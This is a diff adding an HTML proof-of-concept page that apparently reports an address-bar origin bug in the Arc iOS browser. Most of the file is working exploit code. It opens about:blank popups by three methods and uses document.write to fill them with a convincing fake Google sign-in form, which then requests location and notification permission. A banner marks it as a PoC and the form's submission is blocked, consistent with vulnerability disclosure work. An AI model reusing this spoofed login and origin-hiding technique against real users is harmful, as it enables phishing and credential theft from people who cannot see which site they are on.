@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Arc iOS — Empty Origin Indicator PoC</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0d1117;color:#c9d1d9;padding:14px;padding-top:max(14px,env(safe-area-inset-top));padding-bottom:max(60px,env(safe-area-inset-bottom));line-height:1.5}
+h1{font-size:18px;color:#58a6ff;margin-bottom:6px}
+.sub{color:#8b949e;font-size:12.5px;margin-bottom:14px}
+.matrix{width:100%;border-collapse:collapse;font-size:11.5px;margin:10px 0}
+.matrix th,.matrix td{border:1px solid #30363d;padding:6px 8px;text-align:left}
+.matrix th{background:#161b22;color:#7ee787}
+.bug{color:#ff7b72;font-weight:700}
+.ok{color:#7ee787}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:14px;margin:10px 0}
+.card h3{font-size:14px;margin-bottom:4px}
+.card.a h3{color:#ff7b72}
+.card.b h3{color:#d2a8ff}
+.card.c h3{color:#7ee787}
+.card p{color:#8b949e;font-size:11.5px;margin-bottom:10px}
+button{width:100%;padding:15px;border:none;border-radius:10px;font-size:15px;font-weight:600;color:#fff;cursor:pointer}
+button:active{opacity:.75}
+.bA{background:#da3633}
+.bB{background:#8957e5}
+.bC{background:#238636}
+.field{width:100%;padding:12px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#c9d1d9;font-size:14px;margin:6px 0}
+.log{font-family:ui-monospace,monospace;font-size:10.5px;color:#7ee787;background:#010409;border:1px solid #21262d;border-radius:8px;padding:10px;margin-top:10px;max-height:150px;overflow:auto;white-space:pre-wrap;word-break:break-all;-webkit-user-select:text;user-select:text}
+.step{background:#0d2818;border:1px solid #238636;border-radius:8px;padding:10px 12px;font-size:12px;color:#aff5c8;margin:10px 0}
+.step b{color:#7ee787}
+code{background:#010409;padding:1px 5px;border-radius:4px;color:#ffa657;font-size:11px}
+.ver{display:flex;gap:8px;align-items:center;margin:10px 0}
+.ver label{font-size:12px;color:#8b949e;white-space:nowrap}
+</style>
+</head>
+<body>
+
+<h1>Arc iOS — Address Bar Renders No Origin</h1>
+<p class="sub">Security PoC · The Browser Company · WKWebView origin-indicator inconsistency.
+Tap each path, then <b>tap the address bar</b> and note what origin (if any) it shows.</p>
+
+<div class="ver">
+  <label>Arc iOS version:</label>
+  <input id="ver" class="field" style="margin:0" placeholder="Settings → About → e.g. 1.xx.x" autocomplete="off">
+</div>
+
+<table class="matrix">
+<tr><th>Path</th><th>Mechanism</th><th>Expected bar</th></tr>
+<tr><td>A</td><td>anchor.click() + document.write</td><td class="bug">EMPTY ⚠</td></tr>
+<tr><td>B</td><td>window.open + document.write</td><td>? (diagnostic)</td></tr>
+<tr><td>C</td><td>write → navigate → stop()</td><td class="ok">"about:blank"</td></tr>
+</table>
+<p class="sub" style="margin:0 0 4px">All three produce an <code>about:blank</code> document. A correct browser shows the
+<b>same</b> origin string for all three. Arc showing different states = the bug.</p>
+
+<div id="log" class="log">ready — record your Arc version above first</div>
+
+<div class="card a">
+  <h3>Path A — anchor.click() + write &nbsp;(the bug)</h3>
+  <p>Opens an about:blank popup via a synthetic link click, injects a full Google credential
+  form + sets <code>document.title</code>. Observed: address bar shows <b>nothing</b>.</p>
+  <button class="bA" onclick="pathA()">Run Path A</button>
+</div>
+
+<div class="card b">
+  <h3>Path B — window.open() + write &nbsp;(diagnostic)</h3>
+  <p>Same injection, but popup opened via bare <code>window.open('about:blank')</code>.
+  Tells us whether the blank-origin bug is anchor-specific or general.</p>
+  <button class="bB" onclick="pathB()">Run Path B</button>
+</div>
+
+<div class="card c">
+  <h3>Path C — write → navigate → stop &nbsp;(control)</h3>
+  <p>The sibling path that correctly shows <code>about:blank</code>. This is the baseline
+  proving A/B are inconsistent with Arc's own behavior.</p>
+  <button class="bC" onclick="pathC()">Run Path C</button>
+</div>
+
+<div class="step">
+  <b>For each path:</b> 1) tab/popup opens with a fake Google login → 2) tap the address bar →
+  3) note the origin (empty? "about:blank"? something else?) → 4) inside the popup, tap
+  <b>"Check permission-prompt origin"</b> and observe whether the system prompt also shows a blank origin.
+  Screenshot the address bar for every path.
+</div>
+
+<script>
+var TARGET = 'https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn';
+
+function L(m){
+  var d=new Date();
+  var t='['+d.getMinutes()+':'+(d.getSeconds()+'').padStart(2,'0')+'.'+(d.getMilliseconds()+'').padStart(3,'0')+'] ';
+  var el=document.getElementById('log');
+  el.textContent+='\n'+t+m; el.scrollTop=el.scrollHeight;
+}
+
+function phishDoc(pathTag){
+  return '<!DOCTYPE html><html><head>'+
+  '<meta name="viewport" content="width=device-width,initial-scale=1">'+
+  '<title>Sign in - Google Accounts</title></head>'+
+  '<body style="font-family:-apple-system,sans-serif;background:#fff;margin:0;color:#202124">'+
+  '<div style="max-width:400px;margin:0 auto;padding:36px 24px">'+
+  '<div style="text-align:center;font-size:26px;margin-bottom:2px">'+
+    '<span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>'+
+  '<h1 style="text-align:center;font-size:22px;font-weight:400;margin:10px 0 2px">Sign in</h1>'+
+  '<p style="text-align:center;color:#5f6368;font-size:14px;margin-bottom:18px">to continue to Gmail</p>'+
+  '<div style="background:#fff3cd;border:1px solid #ffe69c;color:#664d03;padding:8px 10px;border-radius:6px;font-size:11px;text-align:center;margin-bottom:16px">PoC ('+pathTag+') — check the address bar: what origin is shown?</div>'+
+  '<form onsubmit="ev(event)" action="https://accounts.google.com/signin/challenge/pwd" method="post">'+
+  '<input name="identifier" autocomplete="username" placeholder="Email or phone" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;margin:6px 0;-webkit-appearance:none">'+
+  '<input name="password" type="password" autocomplete="current-password" placeholder="Password" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;margin:6px 0;-webkit-appearance:none">'+
+  '<div style="display:flex;justify-content:space-between;align-items:center;margin-top:18px">'+
+    '<a href="#" onclick="ev(event)" style="color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500">Create account</a>'+
+    '<button type="submit" style="background:#1a73e8;color:#fff;border:none;padding:11px 26px;border-radius:6px;font-size:14px;font-weight:500">Next</button>'+
+  '</div></form>'+
+  '<hr style="border:none;border-top:1px solid #eee;margin:24px 0">'+
+  '<button onclick="perm()" style="width:100%;background:#f1f3f4;color:#3c4043;border:1px solid #dadce0;padding:12px;border-radius:6px;font-size:13px;font-weight:600">Check permission-prompt origin</button>'+
+  '<button onclick="notif()" style="width:100%;background:#f1f3f4;color:#3c4043;border:1px solid #dadce0;padding:12px;border-radius:6px;font-size:13px;font-weight:600;margin-top:8px">Check notification-prompt origin</button>'+
+  '<p id="st" style="font-size:11px;color:#5f6368;text-align:center;margin-top:12px"></p>'+
+  '</div>'+
+  '<scr'+'ipt>'+
+  'function ev(e){e.preventDefault();document.getElementById("st").textContent="(PoC: submission blocked — nothing sent)";}'+
+  'function perm(){try{navigator.geolocation.getCurrentPosition(function(){},function(){});document.getElementById("st").textContent="Location prompt requested — what origin does it show?";}catch(x){document.getElementById("st").textContent="geo err: "+x.message;}}'+
+  'function notif(){try{if(window.Notification){Notification.requestPermission();document.getElementById("st").textContent="Notification prompt requested — what origin does it show?";}else{document.getElementById("st").textContent="Notification API unavailable";}}catch(x){document.getElementById("st").textContent="notif err: "+x.message;}}'+
+  'try{window.opener&&window.opener.postMessage("popup-loaded","*");}catch(x){}'+
+  '<\/scr'+'ipt>'+
+  '</body></html>';
+}
+
+function writeInto(w,tag){
+  try{ w.document.open(); w.document.write(phishDoc(tag)); w.document.close();
+       L(tag+': document.write OK — TAP THE ADDRESS BAR now'); return true; }
+  catch(e){ L(tag+': write BLOCKED — '+e.message); return false; }
+}
+
+// Path A — anchor.click() (observed: EMPTY bar)
+function pathA(){
+  L('Path A: anchor.click() → about:blank → write');
+  var a=document.createElement('a');
+  a.href='about:blank'; a.target='pocA';
+  document.body.appendChild(a); a.click(); a.remove();
+  var w=window.open('','pocA');
+  if(!w){ L('A: no window reference (popup blocked?)'); return; }
+  setTimeout(function(){ writeInto(w,'A'); }, 60);
+}
+
+// Path B — bare window.open() (diagnostic)
+function pathB(){
+  L('Path B: window.open(about:blank) → write');
+  var w=window.open('about:blank','_blank');
+  if(!w){ L('B: popup blocked'); return; }
+  setTimeout(function(){ writeInto(w,'B'); }, 60);
+}
+
+// Path C — write → navigate → stop (control: shows about:blank)
+function pathC(){
+  L('Path C: write → navigate → stop (control)');
+  var w=window.open('about:blank','_blank');
+  if(!w){ L('C: popup blocked'); return; }
+  setTimeout(function(){
+    if(writeInto(w,'C')){
+      try{ w.location.href=TARGET; L('C: navigating to google...'); }catch(e){}
+      setTimeout(function(){ try{ w.stop(); L('C: stop() — bar should read about:blank'); }catch(e){} }, 30);
+    }
+  }, 60);
+}
+
+window.addEventListener('message', function(e){
+  if(e.data==='popup-loaded') L('popup reported loaded');
+});
+</script>
+
+<div style="height:60px"></div>
+</body>
+</html>
